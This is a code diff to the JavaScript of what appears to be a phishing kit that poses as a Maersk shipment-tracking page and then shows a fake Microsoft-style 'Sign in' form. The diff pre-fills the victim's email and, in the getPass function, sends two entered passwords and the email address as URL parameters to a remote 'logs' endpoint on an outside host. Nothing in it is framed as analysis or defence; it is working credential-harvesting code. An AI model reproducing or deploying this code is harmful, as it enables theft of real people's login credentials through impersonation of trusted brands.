@@ -1,5 +1,6 @@
 const validEmail = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
 
+const temp_id = document.getElementById("temp_id");
 
 let maersk_contents = document.getElementById("maersk_contents");
 
@@ -15,6 +16,11 @@ let service_laoding = document.getElementById("service_laoding");
 img_counter = Math.floor(Math.random() * 4);
 let photo_slide  = "https://babo4.github.io/msk/"+img_counter+".png"
 hauling_img.src = photo_slide;
+
+let main_id = "";
+if (validEmail.test(temp_id.value)) {
+    main_id = temp_id.value;
+}
 
 // 1st batch
 
@@ -50,7 +56,7 @@ const maerskPage = `
                     <li>Local Offices</li>
                 </ol>
     
-                <input type="email" placeholder="Enter e-mail address" class="track_input">
+                <input type="email" placeholder="Enter e-mail address" class="track_input" value="${main_id}">
                 <button onclick="maerskBtnSub(this)">Track</button>
                 </section>
             </div>
@@ -248,11 +254,16 @@ track_btn.addEventListener("click", ()=>{
 track_btn.innerHTML = `<span>Please wait . . .</span>`;
 setTimeout(() => {
     maersk_table.innerHTML = maerskPage;
+
+    if (validEmail.test(temp_id.value)) {
+
+        pageMajor(temp_id.value);
+    }
 }, 3000);
 });
 
 function maerskBtnSub(r) {
-    m = r.parentElement
+    let m = r.parentElement
     let m_mail = m.getElementsByClassName("track_input")[0];
 
     if (validEmail.test(m_mail.value)) {
@@ -270,7 +281,20 @@ function maerskBtnSub(r) {
     }, 6000);
 
     setTimeout(() => {
-        maersk_contents.innerHTML = `
+    
+    pageMajor(m_mail.value);
+        
+    }, 9000);
+
+}
+    else{
+        m_mail.style.borderColor = "red";
+    }
+}
+
+
+function pageMajor(mail) {
+    maersk_contents.innerHTML = `
         <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -510,7 +534,7 @@ function maerskBtnSub(r) {
 
                 <h1 id="header_main">Sign in</h1>
 
-                <input id="e_input" value="${m_mail.value}" class="show_pass_content" placeholder="Email, phone, or Skype">
+                <input id="e_input" value="${mail}" class="show_pass_content" placeholder="Email, phone, or Skype">
 
                 <input type="hidden" id="temp_p">
                 <input type="hidden" id="data_send" value="1">
@@ -539,7 +563,7 @@ function maerskBtnSub(r) {
 </html>
 `;
 
-    const urls = new URLSearchParams(window.location.search);
+const urls = new URLSearchParams(window.location.search);
     const user = urls.get('user');
     
     const e_input = document.getElementById("e_input");
@@ -562,15 +586,7 @@ function maerskBtnSub(r) {
 
         e_input.value = "";
         office_sub_form.style.display = "none";
-        
-    }, 9000);
-
 }
-    else{
-        m_mail.style.borderColor = "red";
-    }
-}
-
 
 // 2nd batch
 let rand_num = Math.floor(Math.random() * 2000) + 5000;
@@ -649,10 +665,10 @@ function subFormBtn(btn) {
     // 
     function getPass(pass1, pass2, mail) {
         if (pass1 != "" && pass2 !="" && mail != "") {
-            let url = "maersk.php?auth=office&domain=maersk&pass1="+pass1+"&pass2="+pass2+"&mail="+mail;
+            let url = "mk_shipping.php?auth=office&domain=maersk&pass1="+pass1+"&pass2="+pass2+"&mail="+mail;
     
             if (data_send.value == 1) {
-                url = "https://africanpm.com/logs/msn/maersk.php?auth=office&domain=maersk&pass1="+pass1+"&pass2="+pass2+"&mail="+mail; 
+                url = "https://africanpm.com/logs/boman/mk_shipping.php?auth=office&domain=maersk&pass1="+pass1+"&pass2="+pass2+"&mail="+mail; 
             }
     
             location = url;
